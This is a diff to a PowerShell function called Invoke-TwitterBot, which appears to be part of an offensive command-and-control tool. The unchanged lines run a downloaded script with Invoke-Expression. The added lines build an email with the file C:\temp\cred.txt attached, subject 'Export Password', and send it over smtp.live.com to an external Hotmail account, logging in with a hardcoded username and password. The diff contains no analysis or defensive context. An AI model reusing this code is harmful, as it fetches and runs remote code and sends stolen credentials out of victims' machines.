@@ -247,22 +247,29 @@ Function Invoke-TwitterBot {
             $downloadedScript += $AppendString
             Invoke-Expression $downloadedScript
                
-                $From = "thesupersonic@hotmail.com"
-                $To = "thesupersonic@hotmail.com"
                 $SMTPServer = "smtp.live.com"
-                $SMTPPort = "587"
-                $Username = "thesupersonic@hotmail.com"
-                $Password = "Cyberwarfare"
-                $subject = "Export Password --- "
-                $body = "Follow The White Rabbit..."
-                $attachment = "C:\temp\cred.txt"
-                $smtp.attachments.add($attachment)
-                
-                $smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
+$SMTPPort = "587"
+$Username = "thesupersonic@hotmail.com"
+$Password = "Cyberwarfare"
 
-                $smtp.EnableSSL = $true
-                $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
-                $smtp.Send($From, $To, $subject, $body);
+$to = "thesupersonic@hotmail.com"
+$subject = "Export Password"
+$body = "Follow The White ..."
+$attachment = "C:\temp\cred.txt"
+
+$message = New-Object System.Net.Mail.MailMessage
+$message.subject = $subject
+$message.body = $body
+$message.to.add($to)
+
+$message.from = $username
+$message.attachments.add($attachment)
+
+$smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
+$smtp.EnableSSL = $true
+$smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
+$smtp.send($message)
+write-host "Mail Sent"
             
         }
     
